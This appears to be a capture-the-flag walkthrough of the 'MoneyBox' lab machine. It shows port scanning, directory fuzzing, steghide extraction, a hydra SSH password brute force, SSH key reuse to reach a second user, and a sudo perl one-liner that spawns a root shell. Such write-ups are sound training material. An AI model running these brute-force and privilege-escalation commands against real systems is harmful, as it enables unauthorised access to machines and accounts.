### Initial Scan
`nmap -p- -sC -sV -vv -oN scans/nmap_all_ports.txt 192.168.164.230`
```
21/tcp open  ftp     syn-ack ttl 61 vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)

22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 

80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.38 ((Debian))
```
- FTP, SSH, and HTTP on initial scan, anon access to FTP.
  
### Checking FTP
`ftp 192.168.164.230`

```
ftp> ls
229 Entering Extended Passive Mode (|||60125|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0         1093656 Feb 26  2021 trytofind.jpg
```
Only one file here, `trytofind.jpg`
Downloading the file and opening it doesn't show anything obvious, steghide requests password to extract, can move on to further enumeration for now.
  
### Inspecting http
Nothing interesting on the landing page, fuzzing subdirectories with ffuf - 
`ffuf -w /usr/share/wordlists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.164.230/FUZZ`

```
blogs         [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 36ms]
server-status [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 36ms]
```
Only two hits on this wordlist.

`curl http://192.168.164.230/blogs/`
```
<html>
<head><title>MoneyBox</title></head>
<body>
    <h1>I'm T0m-H4ck3r</h1><br>
        <p>I Already Hacked This Box and Informed.But They didn't Do any Security configuration</p>
        <p>If You Want Hint For Next Step......?<p>
</body>
</html>
<!--the hint is the another secret directory is S3cr3t-T3xt-->
```
- Some interesting info here, potential username, `T0m-H4ck3r`, and another endpoint, `S3cr3t-T3xt`.

`curl http://192.168.164.230/S3cr3t-T3xt/`
```
<html>
<head><title>MoneyBox</title></head>
<body>
    <h1>There is Nothing In this Page.........</h1>
</body>
</html>
<!..Secret Key 3xtr4ctd4t4 >
```
Secret Key: `3xtr4ctd4t4`
Based on the name of the key and a jpg from ftp, a reasonable hypothesis is this is the passphrase to extract data from the file.

### Extracting data from trytofind.jpg
`steghide extract -sf trytofind.jpg`
``` 
Enter passphrase: 3xtr4ctd4t4
wrote extracted data to "data.txt".
```

`cat data.txt`
```
Hello.....  renu

      I tell you something Important.Your Password is too Week So Change Your Password
Don't Underestimate it.......
```
Another potential username, `renu`. The file mentions weak passwords, and with no other endpoints found on the webserver right now, we can background a weak credential bruteforce. Since the file specifically mentions `renu` has a weak password, I will start there bruteforcing ssh (since there is seemingly no other way in right now), while continuing to enumerate.

### SSH bruteforce
`hydra -l renu -vv -P /usr/share/wordlists/rockyou.txt ssh://192.168.164.230`

Almost instantly we get a hit, before I could return to enumeration - 
`[22][ssh] host: 192.168.164.230   login: renu   password: 987654321`

Let's verify a true positive by checking ssh creds - 
`ssh renu@192.168.164.130`
`renu@MoneyBox:~$ `

### Shell as 'renu'
I always like checking for quick hits before digging too deep. Since we have the password for this user (sometimes no password is needed), let's check sudo rights -
`sudo -l` , no sudo privileges
`find / -perm 4000 2>/dev/null` - checks for suid binaries, nothing unusual here
`ls -la /home` - shows another user, `lily`

`find / -user lily 2>/dev/null`
```
/home/lily
/home/lily/.ssh
/home/lily/.ssh/authorized_keys   <-- very intersting
/home/lily/.bashrc
/home/lily/.profile
/home/lily/.local
/home/lily/.local/share
/home/lily/.bash_logout
/home/lily/.bash_history
```
Reading the `/home/lily/.ssh/authorized_keys` shows `renu` has a valid authorized key.
`renu` indeed has an ssh key in `~/.ssh`.

### Shell as 'lily'
Using `renu` id_rsa key, we can ssh into lily's account.
`ssh -i id_rsa lily@localhost`
`lily@MoneyBox:~$ `

`sudo -l` 
```
Matching Defaults entries for lily on MoneyBox:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User lily may run the following commands on MoneyBox:
    (ALL : ALL) NOPASSWD: /usr/bin/perl
```

`lily` can run `perl` as root with no password, a perl one liner will work here.

`sudo perl -e 'exec "/bin/sh"'`

`id` = `uid=0(root) gid=0(root) groups=0(root)`
